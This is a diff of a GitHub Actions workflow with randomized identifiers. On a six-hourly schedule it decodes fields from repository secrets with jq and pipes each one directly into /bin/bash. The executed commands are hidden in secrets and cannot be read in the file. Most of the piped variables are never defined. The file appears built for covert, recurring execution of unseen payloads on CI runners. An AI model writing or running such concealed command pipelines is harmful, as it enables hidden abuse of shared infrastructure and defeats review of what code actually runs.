@@ -1,19 +1,31 @@
 name: durufei6718
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 5/6 * * *'
-jobs:  # 31402
+    - cron: '48 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: durufei6718
         env:
-          vc7491: ${{ secrets.vc7491 }}
+          c18204: ${{ secrets.c18204 }}
         run: |
-          echo $vc7491 | jq -r .y76742 | /bin/bash
-          echo $gugjk55022 | jq -r .jlzt90930 | /bin/bash
-          echo $bqojw2514 | jq -r .z36 | /bin/bash
-          echo $chwqa42 | jq -r .muchw77285 | /bin/bash
+          echo $c18204 | jq -r .mjkxp89 | /bin/bash
+          echo $zm193 | jq -r .pwvy72489 | /bin/bash
+          echo $szc8 | jq -r .ohjp42428 | /bin/bash
+          echo $yimik339 | jq -r .jnkl8 | /bin/bash
+          echo $pihb84636 | jq -r .o9 | /bin/bash
+          echo $ez847 | jq -r .rvcpc92895 | /bin/bash
+          echo $ujko33 | jq -r .yqkdu55229 | /bin/bash
+          echo $fdhsx72352 | jq -r .rg2094 | /bin/bash
+          echo $ha748 | jq -r .skfst3 | /bin/bash
+          echo $oab2413 | jq -r .rjfin6 | /bin/bash
+          echo $puo18615 | jq -r .qdyv3653 | /bin/bash
+          echo $rw93 | jq -r .wd5215 | /bin/bash
+          echo $px26 | jq -r .z920 | /bin/bash
 
